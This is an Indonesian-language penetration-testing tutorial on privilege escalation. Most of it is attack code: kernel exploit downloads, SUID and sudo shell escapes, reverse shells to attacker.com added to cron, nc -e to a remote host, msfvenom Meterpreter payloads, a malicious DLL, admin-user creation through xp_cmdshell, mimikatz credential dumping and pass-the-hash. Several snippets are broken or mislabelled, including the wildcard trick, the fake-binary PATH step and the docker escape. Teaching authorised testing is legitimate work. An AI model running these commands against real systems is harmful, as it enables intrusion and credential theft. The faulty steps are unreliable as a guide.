# 3.2 Privilege Escalation

Privilege escalation adalah proses mendapatkan akses dengan hak akses lebih tinggi (misalnya dari user biasa menjadi root/administrator). Ini adalah salah satu langkah paling krusial dalam penetration testing.

## Metodologi Privilege Escalation

1. **Information Gathering** - Mengumpulkan informasi tentang sistem
2. **Vulnerability Identification** - Mencari konfigurasi yang rentan
3. **Exploitation** - Memanfaatkan vulnerability
4. **Verification** - Memastikan berhasil dapat hak akses lebih tinggi

## Linux Privilege Escalation

### 1. Kernel Exploits

Kernel exploit adalah teknik mengeksploitasi bug di kernel Linux untuk mendapatkan code execution dengan privileges.

#### Contoh: Dirty COW (CVE-2016-5195)

```bash
# Check vulnerability
uname -r
# Output: 4.4.0-21-generic (vulnerable if < 4.4.0-46)

# Download exploit
wget https://www.exploit-db.com/download/40616.c -O dirtyc0w.c

# Compile
gcc -pthread dirtyc0w.c -o dirtyc0w

# Create a low privilege user
useradd test
su test

# Run exploit
./dirtyc0w /etc/passwd root:newpass:0:0:root:/root:/bin/bash

# Switch to root
su root
# Password: newpass
```

#### Contoh: Linux Kernel 4.4 (Ubuntu 16.04)

```bash
# Check version
uname -a
# Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

# Search for exploit
searchsploit ubuntu 16.04 kernel 4.4

# Download and compile
wget https://www.exploit-db.com/download/44298.c
gcc 44298.c -o exploit

# Run exploit
./exploit
# Jika berhasil, akan dapat shell sebagai root
```

#### Script untuk automasi kernel exploits:

```bash
#!/bin/bash
# Kernel exploit checker script

kernel_version=$(uname -r)
echo "Kernel version: $kernel_version"

# Known vulnerable kernel versions
case "$kernel_version" in
    2.6.*)
        echo "Vulnerable to multiple exploits"
        echo "Try: searchsploit linux kernel 2.6"
        ;;
    3.*)
        echo "May be vulnerable to perf_swevent exploit"
        ;;
    4.*)
        echo "May be vulnerable to Dirty COW or similar"
        ;;
esac

# Disable ASLR for easier exploitation
echo 0 > /proc/sys/kernel/randomize_va_space
```

### 2. SUID/SGID Binary Exploitation

SUID (Set User ID) bit memungkinkan binary dijalankan dengan privileges dari pemilik file.

#### Mencari SUID binaries:

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Common SUID binaries yang sering rentan:
# - /usr/bin/nmap (older versions)
# - /usr/bin/vim
# - /usr/bin/find
# - /usr/bin/nano
# - /bin/ping
# - /usr/bin/passwd
```

#### Exploiting SUID binaries:

**Nmap (Versi < 3.8):**
```bash
# Check nmap version
nmap -V

# Interactive mode exploitation
nmap --interactive
!sh

# Atau execute script
echo "os.execute('/bin/sh')" > /tmp/script.nse
sudo nmap --script=/tmp/script.nse
```

**Vim/Nano Editor:**
```bash
# Edit file yang dimiliki root dengan SUID vim
vim /etc/shadow
# Setelah editor terbuka:
:!/bin/sh

# Atau edit authorized_keys
vim ~/.ssh/authorized_keys
# Add attacker public key
```

**Find Command:**
```bash
# Find dengan SUID bit
find /etc/passwd -exec /bin/sh \;

# Atau lebih subtle
find / -name "somefile" -exec /bin/sh \;
```

**Nano:**
```bash
nano /etc/passwd
# Edit file untuk menambah user dengan UID 0
# Atau dalam nano:
^R (Read File)
^X (Exit)
^T (Execute Command)
/bin/sh
```

### 3. Sudo Misconfiguration

Sudo misconfiguration terjadi ketika user bisa menjalankan command sebagai root tanpa password atau dengan configuration yang salah.

#### Checking sudo configuration:

```bash
# Check sudo access
sudo -l

# Output yang menarik:
# (ALL) NOPASSWD: ALL
# (root) /usr/bin/vim
# (root) /usr/bin/less
# (root) /bin/more
```

#### Exploiting sudo misconfiguration:

**NOPASSWD ALL:**
```bash
# Jika user memiliki NOPASSWD ALL
sudo su -
# Atau
sudo bash -i
```

**Specific Commands:**
```bash
# Jika bisa menjalankan vim sebagai root
sudo vim -c ':!/bin/sh'

# Jika bisa menjalankan tcpdump
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root

# Jika bisa menjalankan find
sudo find /etc/passwd -exec /bin/sh \;

# Jika bisa menjalankan less/more
sudo less /etc/passwd
# Dalam less:
!/bin/sh
```

**Sudo environment variables:**
```bash
# Jika LD_PRELOAD diizinkan
echo 'void _init() { system("/bin/sh"); }' > /tmp/evil.c
gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so /bin/ls

# Jika sudoedit diizinkan
sudoedit /etc/passwd
# Edit untuk menambah user dengan UID 0
```

### 4. Cron Job Exploitation

Cron jobs adalah scheduled tasks yang berjalan dengan privileges dari user yang menjadwalkannya.

#### Mencari cron jobs:

```bash
# System cron jobs
cat /etc/crontab

# User cron jobs
crontab -l

# Cron directories
ls -la /etc/cron.*/
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
```

#### Exploiting cron jobs:

**File dengan weak permissions:**
```bash
# Check permissions dari cron scripts
ls -la /etc/cron.daily/script.sh
# Jika writable by current user:

# Add reverse shell ke script
echo "*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# Atau modify script yang ada
echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/cron.daily/script.sh
```

**Wildcard exploitation:**
```bash
# Jika cron job menggunakan wildcard
# Contoh crontab entry:
# */1 * * * * root /bin/sh /backup.sh *

# Create malicious files
touch -- "-rf"
touch -- "--help"
echo 'chmod 777 /etc/shadow' > "script.sh"
chmod +x script.sh
# Ketika script dijalankan dengan * akan execute script.sh
```

**PATH manipulation:**
```bash
# Check script yang menggunakan relative path
# Contoh script:
# #!/bin/bash
# somecommand

# Create malicious somecommand
echo '/bin/sh' > somecommand
chmod +x somecommand
# Modify PATH untuk menjalankan script kita
export PATH=.:$PATH
# Tunggu cron job berjalan
```

### 5. PATH Variable Manipulation

PATH variable menentukan di mana shell akan mencari executable.

#### Checking PATH:

```bash
# Current PATH
echo $PATH
# Output: /usr/local/bin:/usr/bin:/bin

# Check directories with write permissions
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {}
```

#### Exploiting PATH:

**Writable directory in PATH:**
```bash
# Jika salah satu directory di PATH writable
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/user/bin

# Jika /home/user/bin writable:
echo '/bin/sh' > /home/user/bin/ls
chmod +x /home/user/bin/ls

# Execute script yang memanggil ls
# atau trigger binary yang akan memanggil ls
```

**Create fake binary:**
```bash
# Create malicious binary
cat > fake_binary.c << EOF
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/sh");
    return 0;
}
EOF

gcc -o fake_binary fake_binary.c

# Tambahkan ke awal PATH
export PATH=/path/to/fake_binary:$PATH
```

## Windows Privilege Escalation

### 1. Unquoted Service Path

Service dengan path yang tidak memiliki quotes bisa dieksploitasi untuk privilege escalation.

#### Mencari unquoted service paths:

```cmd
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# PowerShell alternative
gwmi win32_service | Where-Object {$_.PathName -notlike '*"*' -and $_.StartMode -eq "Auto"} | Select Name,PathName
```

#### Exploiting unquoted service paths:

```cmd
# Contoh vulnerable service:
# C:\Program Files\Vulnerable App\app.exe

# Step 1: Create malicious executable
# Metasploit payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > "C:\Program.exe"

# Step 2: Place executable
copy malicious.exe "C:\Program.exe"

# Step 3: Trigger service restart
sc stop "Vulnerable App"
sc start "Vulnerable App"

# Atau reboot system
shutdown /r
```

### 2. Weak Service Permissions

Service dengan weak permissions memungkinkan attacker untuk modify configuration.

#### Checking service permissions:

```cmd
# Using accesschk from Sysinternals
accesschk.exe -ucqv "Service Name"

# Check semua services
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Users" *
```

#### Exploiting weak service permissions:

```cmd
# Jika user bisa modify service binary path
sc config "Vulnerable Service" binpath= "C:\temp\reverse.exe"

# Start service
sc start "Vulnerable Service"

# Jika bisa start/stop service
sc stop "Service Name"
# Dan kemudian modify config file yang digunakan service
```

### 3. AlwaysInstallElevated

Windows Registry setting yang memungkinkan user non-admin untuk install MSI files dengan elevated privileges.

#### Checking AlwaysInstallElevated:

```cmd
# Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated"
```

#### Exploiting AlwaysInstallElevated:

```cmd
# Create malicious MSI
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi > install.msi

# Install MSI
msiexec /quiet /qn /i install.msi

# Atau use custom MSI with embedded payload
```

### 4. Stored Credentials

Windows sering menyimpan credentials di berbagai lokasi.

#### Finding stored credentials:

```cmd
# SAM database
# Extract with tools seperti:
fgdump.exe
pwdump7.exe

# Registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKCU\Software\ORL\WinVNC3\Password"

# IIS passwords
%systemroot%\system32\inetsrv\MetaBase.xml

# Saved credentials
cmdkey /list

# Browser passwords
# Manual extraction atau dengan tools seperti:
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
```

#### Exploiting stored credentials:

```cmd
# Pass the hash with pth-winexe
pth-winexe -U user%hash //target cmd

# Pass the hash with Metasploit
use exploit/windows/smb/psexec
set RHOSTS target
set SMBUser user
set SMBPass hash
set SMBDomain .
exploit

# Use cracked passwords
net use \\target\C$ /user:admin password
psexec \\target cmd
```

### 5. DLL Hijacking

DLL hijacking adalah teknik mengganti legitimate DLL dengan malicious DLL.

#### Finding vulnerable applications:

```cmd
# Use Process Monitor to find missing DLLs
# Launch procmon.exe
# Filter for "NAME NOT FOUND" in Path
# Launch application
# Watch for DLL attempts

# Check aplikasi yang mencari DLL di current directory
# atau di writable directories
```

#### Creating malicious DLL:

```c
// dllmain.c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe");
        // Atau reverse shell:
        // system("powershell -enc <base64_payload>");
    }
    return TRUE;
}
```

```bash
# Compile dengan mingw
x86_64-w64-mingw32-gcc -shared -o malicious.dll dllmain.c

# Place DLL di lokasi yang akan dicari oleh aplikasi
copy malicious.dll "C:\Program Files\Vulnerable App\missing.dll"
```

## Database Privilege Escalation

### MySQL UDF (User Defined Function)

```sql
-- Check untuk UDF
SELECT * FROM mysql.func;

-- Create UDF untuk command execution
CREATE TABLE temp(line blob);
INSERT INTO temp VALUES(load_file('/lib/lib_mysqludf_sys.so'));
SELECT * FROM temp INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT do_system('nc -nv attacker.com 4444 -e /bin/bash');
```

### MSSQL xp_cmdshell

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker password /add'
EXEC xp_cmdshell 'net localgroup Administrators hacker /add'
```

## Container Escapes

### Docker Escape

```bash
# Check if running in Docker
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# If Docker socket mounted in container
ls -la /var/run/docker.sock

# Escape with Docker socket
docker run -v /:/host --privileged -it chroot /host /bin/bash

# Mount host filesystem
# Check /dev for disk devices
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt
```

## Automation Tools

### Linux Privilege Escalation Scripts

```bash
# LinPEAS
curl https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

### Windows Privilege Escalation Scripts

```powershell
# WinPEAS
powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEAS.bat')"

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Sherlock
Import-Module .\Sherlock.ps1
Find-AllVulns
```

## Best Practices

1. **Verify success**: Selalu verifikasi bahwa privilege escalation berhasil
   ```bash
   # Linux
   id
   whoami

   # Windows
   whoami /groups
   net session
   ```

2. **Clean up**: Remove exploit artifacts setelah berhasil
   ```bash
   # Remove created files
   rm /tmp/exploit.c
   rm /tmp/evil.so

   # Restore modified files
   ```

3. **Document**: Simpan proof dari privilege escalation
   ```bash
   # Screenshot
   # Save configuration files
   # Record exploit used
   ```

4. **Try multiple methods**: Jika satu method gagal, coba yang lain
5. **Check for defenses**: Perhatikan SELinux, AppArmor, atau security controls lainnya

## Common Pitfalls

1. **System crashes**: Beberapa exploits bisa crash sistem
2. **Detection**: Beberapa teknik mudah terdeteksi oleh AV/EDR
3. **Log generation**: Exploits meninggalkan jejak di log files
4. **Temporary access**: Beberapa privilege escalation hanya temporary